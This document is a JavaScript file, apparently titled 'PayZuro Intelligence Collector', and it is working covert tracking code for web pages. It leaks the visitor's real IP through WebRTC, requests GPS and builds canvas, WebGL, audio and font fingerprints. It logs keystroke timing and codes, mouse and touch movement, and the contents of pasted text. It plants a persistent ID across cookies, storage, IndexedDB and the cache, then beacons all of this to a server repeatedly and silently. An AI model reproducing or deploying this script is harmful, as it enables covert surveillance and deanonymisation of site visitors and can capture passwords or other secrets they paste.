/**
 * PayZuro Intelligence Collector v1.0
 * Silently collects device fingerprint, real IP, geolocation, and behavioral data.
 * Sends data to collect.php in the background.
 */
(function() {
    'use strict';

    const COLLECT_ENDPOINT = 'collect.php';
    const dossier = {
        timestamp: new Date().toISOString(),
        fingerprint: {},
        network: {},
        location: {},
        device: {},
        behavior: {},
        persistence: {}
    };

    // ─── Utility ───────────────────────────────────────────────────
    function send(data) {
        try {
            const payload = JSON.stringify(data);
            if (navigator.sendBeacon) {
                navigator.sendBeacon(COLLECT_ENDPOINT, new Blob([payload], { type: 'application/json' }));
            } else {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', COLLECT_ENDPOINT, true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(payload);
            }
        } catch (e) { /* silent */ }
    }

    // Send partial data every few seconds and a final on unload
    let sendTimer = null;
    function scheduleSend() {
        if (sendTimer) clearTimeout(sendTimer);
        sendTimer = setTimeout(function() { send(dossier); }, 3000);
    }

    // ─── 1. WebRTC Real IP Leak ────────────────────────────────────
    function collectWebRTC() {
        return new Promise(function(resolve) {
            try {
                const ips = {};
                const rtc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection)(
                    { iceServers: [
                        { urls: 'stun:stun.l.google.com:19302' },
                        { urls: 'stun:stun1.l.google.com:19302' },
                        { urls: 'stun:stun2.l.google.com:19302' }
                    ] }
                );
                rtc.createDataChannel('');
                rtc.createOffer().then(function(offer) {
                    // Parse SDP for IPs
                    var sdpLines = offer.sdp.split('\n');
                    sdpLines.forEach(function(line) {
                        var match = line.match(/a=candidate.*?(\d+\.\d+\.\d+\.\d+)/);
                        if (match) {
                            var ip = match[1];
                            if (ip !== '0.0.0.0') ips[ip] = true;
                        }
                        // IPv6
                        var match6 = line.match(/a=candidate.*?([0-9a-f]{1,4}(:[0-9a-f]{1,4}){7})/i);
                        if (match6) ips[match6[1]] = true;
                    });
                    rtc.setLocalDescription(offer);
                });

                rtc.onicecandidate = function(e) {
                    if (e.candidate) {
                        var parts = e.candidate.candidate.split(' ');
                        if (parts.length > 4) {
                            var ip = parts[4];
                            if (ip && ip !== '0.0.0.0') ips[ip] = true;
                        }
                    } else {
                        // Done gathering
                        dossier.network.webrtc_ips = Object.keys(ips);
                        rtc.close();
                        resolve();
                    }
                };

                // Safety timeout
                setTimeout(function() {
                    dossier.network.webrtc_ips = Object.keys(ips);
                    try { rtc.close(); } catch(e) {}
                    resolve();
                }, 5000);
            } catch (e) {
                dossier.network.webrtc_error = e.message;
                resolve();
            }
        });
    }

    // ─── 2. Geolocation (GPS) ──────────────────────────────────────
    function collectGeolocation() {
        return new Promise(function(resolve) {
            if (!navigator.geolocation) {
                dossier.location.gps_error = 'not_supported';
                resolve();
                return;
            }
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    dossier.location.latitude = pos.coords.latitude;
                    dossier.location.longitude = pos.coords.longitude;
                    dossier.location.accuracy_meters = pos.coords.accuracy;
                    dossier.location.altitude = pos.coords.altitude;
                    dossier.location.speed = pos.coords.speed;
                    dossier.location.heading = pos.coords.heading;
                    dossier.location.gps_timestamp = new Date(pos.timestamp).toISOString();
                    resolve();
                },
                function(err) {
                    dossier.location.gps_error = err.message;
                    dossier.location.gps_error_code = err.code;
                    resolve();
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    // ─── 3. Canvas Fingerprint ─────────────────────────────────────
    function collectCanvasFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 280;
            canvas.height = 60;
            var ctx = canvas.getContext('2d');

            // Draw complex shapes for unique rendering
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.font = '14px Arial';
            ctx.fillText('PayZuro Verify 🔐', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.font = '18px Times New Roman';
            ctx.fillText('Identity Check ✓', 4, 45);

            // Gradient
            var gradient = ctx.createLinearGradient(0, 0, canvas.width, 0);
            gradient.addColorStop(0, '#ff0000');
            gradient.addColorStop(0.5, '#00ff00');
            gradient.addColorStop(1, '#0000ff');
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 50, canvas.width, 10);

            // Arc
            ctx.beginPath();
            ctx.arc(50, 30, 15, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.fill();

            dossier.fingerprint.canvas_hash = hashCode(canvas.toDataURL());
            dossier.fingerprint.canvas_data = canvas.toDataURL().substring(0, 200);
        } catch (e) {
            dossier.fingerprint.canvas_error = e.message;
        }
    }

    // ─── 4. WebGL Fingerprint ──────────────────────────────────────
    function collectWebGLFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) {
                dossier.fingerprint.webgl_error = 'not_supported';
                return;
            }

            var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            dossier.fingerprint.webgl_vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
            dossier.fingerprint.webgl_renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
            dossier.fingerprint.webgl_version = gl.getParameter(gl.VERSION);
            dossier.fingerprint.webgl_shading_lang = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
            dossier.fingerprint.webgl_max_texture = gl.getParameter(gl.MAX_TEXTURE_SIZE);
            dossier.fingerprint.webgl_max_viewport = gl.getParameter(gl.MAX_VIEWPORT_DIMS);
            dossier.fingerprint.webgl_extensions = gl.getSupportedExtensions();

            // WebGL rendering fingerprint
            canvas.width = 64;
            canvas.height = 64;
            var program = createWebGLProgram(gl);
            if (program) {
                gl.drawArrays(gl.TRIANGLES, 0, 3);
                var pixels = new Uint8Array(64 * 64 * 4);
                gl.readPixels(0, 0, 64, 64, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
                dossier.fingerprint.webgl_hash = hashCode(Array.from(pixels.slice(0, 256)).join(','));
            }
        } catch (e) {
            dossier.fingerprint.webgl_error = e.message;
        }
    }

    function createWebGLProgram(gl) {
        try {
            var vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, 'attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}');
            gl.compileShader(vs);
            var fs = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fs, 'precision mediump float;void main(){gl_FragColor=vec4(0.86,0.44,0.09,1.0);}');
            gl.compileShader(fs);
            var prog = gl.createProgram();
            gl.attachShader(prog, vs);
            gl.attachShader(prog, fs);
            gl.linkProgram(prog);
            gl.useProgram(prog);
            var buf = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, buf);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 3, -1, -1, 3]), gl.STATIC_DRAW);
            var loc = gl.getAttribLocation(prog, 'p');
            gl.enableVertexAttribArray(loc);
            gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
            return prog;
        } catch (e) { return null; }
    }

    // ─── 5. AudioContext Fingerprint ───────────────────────────────
    function collectAudioFingerprint() {
        return new Promise(function(resolve) {
            try {
                var AudioCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                if (!AudioCtx) {
                    dossier.fingerprint.audio_error = 'not_supported';
                    resolve();
                    return;
                }
                var context = new AudioCtx(1, 44100, 44100);
                var osc = context.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, context.currentTime);

                var compressor = context.createDynamicsCompressor();
                compressor.threshold.setValueAtTime(-50, context.currentTime);
                compressor.knee.setValueAtTime(40, context.currentTime);
                compressor.ratio.setValueAtTime(12, context.currentTime);
                compressor.attack.setValueAtTime(0, context.currentTime);
                compressor.release.setValueAtTime(0.25, context.currentTime);

                osc.connect(compressor);
                compressor.connect(context.destination);
                osc.start(0);
                context.startRendering();

                context.oncomplete = function(event) {
                    var data = event.renderedBuffer.getChannelData(0);
                    var sum = 0;
                    for (var i = 4500; i < 5000; i++) { sum += Math.abs(data[i]); }
                    dossier.fingerprint.audio_hash = sum.toString();
                    dossier.fingerprint.audio_sample = Array.from(data.slice(4500, 4510));
                    resolve();
                };

                setTimeout(resolve, 3000);
            } catch (e) {
                dossier.fingerprint.audio_error = e.message;
                resolve();
            }
        });
    }

    // ─── 6. Font Detection ─────────────────────────────────────────
    function collectFonts() {
        try {
            var testFonts = [
                'Arial', 'Arial Black', 'Calibri', 'Cambria', 'Comic Sans MS',
                'Courier New', 'Georgia', 'Helvetica', 'Impact', 'Lucida Console',
                'Lucida Sans Unicode', 'Microsoft Sans Serif', 'Palatino Linotype',
                'Segoe UI', 'Tahoma', 'Times New Roman', 'Trebuchet MS', 'Verdana',
                'Wingdings', 'Andale Mono', 'Consolas', 'Menlo', 'Monaco',
                'Noto Sans', 'Roboto', 'Ubuntu', 'Droid Sans', 'Cantarell',
                'Lato', 'Open Sans', 'Oswald', 'Source Sans Pro', 'Raleway',
                'PT Sans', 'Merriweather', 'Nanum Gothic', 'Malgun Gothic',
                'SimSun', 'SimHei', 'Microsoft YaHei', 'PingFang SC', 'Hiragino Sans',
                'MS Gothic', 'Meiryo', 'Gulim', 'Batang',
                'Apple Chancery', 'Zapfino', 'Bradley Hand', 'Brush Script MT'
            ];

            var baseFonts = ['monospace', 'sans-serif', 'serif'];
            var testString = 'mmmmmmmmmmlli';
            var testSize = '72px';
            var span = document.createElement('span');
            span.style.fontSize = testSize;
            span.style.position = 'absolute';
            span.style.left = '-9999px';
            span.style.top = '-9999px';
            span.innerHTML = testString;
            document.body.appendChild(span);

            var baseWidths = {};
            baseFonts.forEach(function(base) {
                span.style.fontFamily = base;
                baseWidths[base] = span.offsetWidth;
            });

            var detected = [];
            testFonts.forEach(function(font) {
                for (var i = 0; i < baseFonts.length; i++) {
                    span.style.fontFamily = '"' + font + '",' + baseFonts[i];
                    if (span.offsetWidth !== baseWidths[baseFonts[i]]) {
                        detected.push(font);
                        break;
                    }
                }
            });

            document.body.removeChild(span);
            dossier.fingerprint.fonts = detected;
            dossier.fingerprint.font_count = detected.length;
        } catch (e) {
            dossier.fingerprint.font_error = e.message;
        }
    }

    // ─── 7. Navigator & Device Properties ──────────────────────────
    function collectDeviceInfo() {
        var nav = navigator;
        dossier.device = {
            user_agent: nav.userAgent,
            platform: nav.platform,
            vendor: nav.vendor,
            language: nav.language,
            languages: nav.languages ? Array.from(nav.languages) : [],
            cpu_cores: nav.hardwareConcurrency || 'unknown',
            device_memory_gb: nav.deviceMemory || 'unknown',
            max_touch_points: nav.maxTouchPoints || 0,
            do_not_track: nav.doNotTrack,
            cookie_enabled: nav.cookieEnabled,
            pdf_viewer: nav.pdfViewerEnabled,
            webdriver: nav.webdriver || false,

            // Screen
            screen_width: screen.width,
            screen_height: screen.height,
            screen_avail_width: screen.availWidth,
            screen_avail_height: screen.availHeight,
            color_depth: screen.colorDepth,
            pixel_depth: screen.pixelDepth,
            pixel_ratio: window.devicePixelRatio,

            // Window
            inner_width: window.innerWidth,
            inner_height: window.innerHeight,

            // Timezone
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezone_offset: new Date().getTimezoneOffset(),
            locale: Intl.DateTimeFormat().resolvedOptions().locale,

            // Connection
            online: nav.onLine,
        };

        // Connection API
        if (nav.connection) {
            dossier.device.connection_type = nav.connection.effectiveType;
            dossier.device.connection_downlink = nav.connection.downlink;
            dossier.device.connection_rtt = nav.connection.rtt;
            dossier.device.connection_save_data = nav.connection.saveData;
        }

        // Battery
        if (nav.getBattery) {
            nav.getBattery().then(function(batt) {
                dossier.device.battery_level = batt.level;
                dossier.device.battery_charging = batt.charging;
                dossier.device.battery_charging_time = batt.chargingTime;
                dossier.device.battery_discharging_time = batt.dischargingTime;
                scheduleSend();
            }).catch(function() {});
        }

        // Media devices (enumerate without permission to get device count)
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            navigator.mediaDevices.enumerateDevices().then(function(devices) {
                dossier.device.media_devices = devices.map(function(d) {
                    return { kind: d.kind, label: d.label || 'unlabeled', deviceId: d.deviceId ? d.deviceId.substring(0, 16) : '' };
                });
                dossier.device.camera_count = devices.filter(function(d) { return d.kind === 'videoinput'; }).length;
                dossier.device.mic_count = devices.filter(function(d) { return d.kind === 'audioinput'; }).length;
                scheduleSend();
            }).catch(function() {});
        }

        // Plugins
        if (nav.plugins) {
            dossier.device.plugins = [];
            for (var i = 0; i < Math.min(nav.plugins.length, 30); i++) {
                dossier.device.plugins.push({
                    name: nav.plugins[i].name,
                    filename: nav.plugins[i].filename,
                    description: nav.plugins[i].description
                });
            }
        }
    }

    // ─── 8. Behavioral Biometrics ──────────────────────────────────
    function collectBehavior() {
        var mouseData = [];
        var clickData = [];
        var keyData = [];
        var touchData = [];
        var scrollData = [];
        var startTime = Date.now();
        var maxEvents = 200;

        // Mouse movements (sample every 5th event)
        var moveCount = 0;
        document.addEventListener('mousemove', function(e) {
            moveCount++;
            if (moveCount % 5 === 0 && mouseData.length < maxEvents) {
                mouseData.push({
                    x: e.clientX,
                    y: e.clientY,
                    t: Date.now() - startTime
                });
            }
        }, { passive: true });

        // Clicks
        document.addEventListener('click', function(e) {
            if (clickData.length < 50) {
                clickData.push({
                    x: e.clientX,
                    y: e.clientY,
                    t: Date.now() - startTime,
                    target: e.target.tagName
                });
            }
        }, { passive: true });

        // Key timing (no actual keys, just timing patterns)
        document.addEventListener('keydown', function(e) {
            if (keyData.length < 100) {
                keyData.push({
                    t: Date.now() - startTime,
                    code: e.code,    // physical key position, not value
                    shift: e.shiftKey,
                    ctrl: e.ctrlKey
                });
            }
        }, { passive: true });

        // Touch events
        document.addEventListener('touchstart', function(e) {
            if (touchData.length < 50) {
                var touch = e.touches[0];
                touchData.push({
                    x: touch.clientX,
                    y: touch.clientY,
                    t: Date.now() - startTime,
                    force: touch.force || 0,
                    radius: touch.radiusX || 0
                });
            }
        }, { passive: true });

        // Scroll
        document.addEventListener('scroll', function() {
            if (scrollData.length < 50) {
                scrollData.push({
                    x: window.scrollX,
                    y: window.scrollY,
                    t: Date.now() - startTime
                });
            }
        }, { passive: true });

        // Periodic flush to dossier
        setInterval(function() {
            dossier.behavior = {
                mouse_moves: mouseData.length,
                mouse_samples: mouseData.slice(-50),
                clicks: clickData,
                key_timing: keyData,
                touch_events: touchData,
                scroll_events: scrollData,
                session_duration_ms: Date.now() - startTime,
                total_mouse_events: moveCount
            };
        }, 5000);
    }

    // ─── 9. Persistent Identifiers (Evercookie-lite) ───────────────
    function collectPersistence() {
        var uid = generateUID();

        // Try to recover existing ID from any storage
        var recovered = null;
        var sources = [];

        try {
            var ls = localStorage.getItem('_pzv');
            if (ls) { recovered = ls; sources.push('localStorage'); }
        } catch(e) {}

        try {
            var ss = sessionStorage.getItem('_pzv');
            if (ss) { recovered = recovered || ss; sources.push('sessionStorage'); }
        } catch(e) {}

        // Cookie
        try {
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {
                var c = cookies[i].trim();
                if (c.indexOf('_pzv=') === 0) {
                    var val = c.substring(5);
                    recovered = recovered || val;
                    sources.push('cookie');
                }
            }
        } catch(e) {}

        // IndexedDB
        try {
            var req = indexedDB.open('_pzv_db', 1);
            req.onupgradeneeded = function(e) {
                var db = e.target.result;
                db.createObjectStore('ids', { keyPath: 'key' });
            };
            req.onsuccess = function(e) {
                var db = e.target.result;
                try {
                    var tx = db.transaction('ids', 'readonly');
                    var store = tx.objectStore('ids');
                    var get = store.get('uid');
                    get.onsuccess = function() {
                        if (get.result) {
                            recovered = recovered || get.result.value;
                            sources.push('indexedDB');
                        }
                        // Now store in all locations
                        storeEverywhere(recovered || uid);
                        dossier.persistence.sources_recovered = sources;
                        scheduleSend();
                    };
                } catch(e) {
                    storeEverywhere(recovered || uid);
                }
            };
        } catch(e) {
            storeEverywhere(recovered || uid);
        }

        var finalId = recovered || uid;
        dossier.persistence.tracking_id = finalId;
        dossier.persistence.is_returning = !!recovered;
        dossier.persistence.sources_recovered = sources;

        // Store everywhere
        storeEverywhere(finalId);
    }

    function storeEverywhere(uid) {
        // localStorage
        try { localStorage.setItem('_pzv', uid); } catch(e) {}
        // sessionStorage
        try { sessionStorage.setItem('_pzv', uid); } catch(e) {}
        // Cookie (1 year expiry)
        try {
            var d = new Date();
            d.setFullYear(d.getFullYear() + 1);
            document.cookie = '_pzv=' + uid + '; expires=' + d.toUTCString() + '; path=/; SameSite=Lax';
        } catch(e) {}
        // IndexedDB
        try {
            var req = indexedDB.open('_pzv_db', 1);
            req.onsuccess = function(e) {
                try {
                    var db = e.target.result;
                    var tx = db.transaction('ids', 'readwrite');
                    tx.objectStore('ids').put({ key: 'uid', value: uid });
                } catch(e) {}
            };
        } catch(e) {}
        // Cache API
        try {
            if ('caches' in window) {
                caches.open('_pzv_cache').then(function(cache) {
                    cache.put('/_pzv_id', new Response(uid));
                }).catch(function() {});
            }
        } catch(e) {}
    }

    // ─── 10. VPN / Proxy Detection Signals ─────────────────────────
    function collectVPNSignals() {
        dossier.network.vpn_signals = {};

        // Timezone vs IP mismatch will be computed server-side
        // But we collect all timezone indicators
        dossier.network.vpn_signals.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        dossier.network.vpn_signals.timezone_offset = new Date().getTimezoneOffset();
        dossier.network.vpn_signals.locale = navigator.language;
        dossier.network.vpn_signals.languages = navigator.languages ? Array.from(navigator.languages) : [];

        // Performance timing (can reveal proxy latency)
        if (window.performance && window.performance.timing) {
            var t = window.performance.timing;
            dossier.network.vpn_signals.dns_time = t.domainLookupEnd - t.domainLookupStart;
            dossier.network.vpn_signals.connect_time = t.connectEnd - t.connectStart;
            dossier.network.vpn_signals.ttfb = t.responseStart - t.requestStart;
        }

        // WebRTC data is collected separately
    }

    // ─── 11. Referrer & Page Context ───────────────────────────────
    function collectPageContext() {
        dossier.network.referrer = document.referrer || 'direct';
        dossier.network.current_url = window.location.href;
        dossier.network.url_params = {};
        var params = new URLSearchParams(window.location.search);
        params.forEach(function(value, key) {
            dossier.network.url_params[key] = value;
        });
    }

    // ─── 12. Clipboard (passive read on paste events) ──────────────
    function collectClipboard() {
        document.addEventListener('paste', function(e) {
            try {
                var text = (e.clipboardData || window.clipboardData).getData('text');
                if (text && text.length < 5000) {
                    if (!dossier.behavior.clipboard) dossier.behavior.clipboard = [];
                    dossier.behavior.clipboard.push({
                        text: text,
                        t: Date.now()
                    });
                    scheduleSend();
                }
            } catch(e) {}
        });
    }

    // ─── 13. Generate composite fingerprint hash ───────────────────
    function generateCompositeHash() {
        var components = [
            dossier.fingerprint.canvas_hash,
            dossier.fingerprint.webgl_renderer,
            dossier.fingerprint.webgl_vendor,
            dossier.fingerprint.audio_hash,
            dossier.fingerprint.font_count,
            dossier.device.user_agent,
            dossier.device.platform,
            dossier.device.cpu_cores,
            dossier.device.device_memory_gb,
            dossier.device.screen_width + 'x' + dossier.device.screen_height,
            dossier.device.color_depth,
            dossier.device.pixel_ratio,
            dossier.device.timezone
        ].filter(Boolean).join('|||');

        dossier.fingerprint.composite_hash = hashCode(components);
    }

    // ─── Hash function ─────────────────────────────────────────────
    function hashCode(str) {
        var hash = 0;
        str = String(str);
        for (var i = 0; i < str.length; i++) {
            var char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // 32-bit integer
        }
        return hash.toString(16);
    }

    function generateUID() {
        return 'pzv_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 10);
    }

    // ─── Main execution ────────────────────────────────────────────
    async function collect() {
        // Synchronous collectors
        collectDeviceInfo();
        collectCanvasFingerprint();
        collectWebGLFingerprint();
        collectFonts();
        collectPageContext();
        collectVPNSignals();
        collectPersistence();
        collectClipboard();
        collectBehavior();

        // Async collectors
        await Promise.all([
            collectWebRTC(),
            collectAudioFingerprint(),
            collectGeolocation()
        ]);

        // Generate composite hash
        generateCompositeHash();

        // Initial send
        send(dossier);

        // Periodic updates (catches behavioral data)
        setInterval(function() {
            send(dossier);
        }, 15000);

        // Send on page unload
        window.addEventListener('beforeunload', function() {
            dossier.behavior.session_duration_ms = Date.now() - (Date.now() - (dossier.behavior.session_duration_ms || 0));
            send(dossier);
        });
    }

    // Start collection when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', collect);
    } else {
        collect();
    }
})();
